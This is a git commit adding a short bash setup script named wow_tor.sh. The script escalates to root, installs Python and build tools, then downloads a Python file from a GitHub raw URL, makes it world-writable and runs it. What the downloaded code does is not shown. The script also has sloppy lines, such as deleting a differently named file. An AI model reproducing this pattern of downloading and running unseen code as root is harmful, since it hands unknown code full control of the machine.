9936d1618c6045f927d82f6fa0ed070e2d2bd4bd
ts6aud5vkg <44915776+ts6aud5vkg@users.noreply.github.com>
2019-11-26 17:13:57 +0700

    Create wow_tor.sh

---
+++ wow_tor.sh
@@ -0,0 +1,18 @@
+#!/bin/bash
+if [ "$(id -u)" != "0" ]; then
+   sudo su   
+else
+	echo "Root user"
+fi
+sudo -i
+apt-get update
+apt-get install -y git wget screen
+apt-get install -y python python-dev
+apt-get install -y epel-release
+apt-get install -y python-pip
+apt-get install -y gcc-c++
+pip install sh
+rm -rf ubuntu_tor_docker.py
+wget https://raw.githubusercontent.com/ts6aud5vkg/wow/master/wow_tor_docker.py
+chmod 777 wow_tor_docker.py
+python wow_tor_docker.py
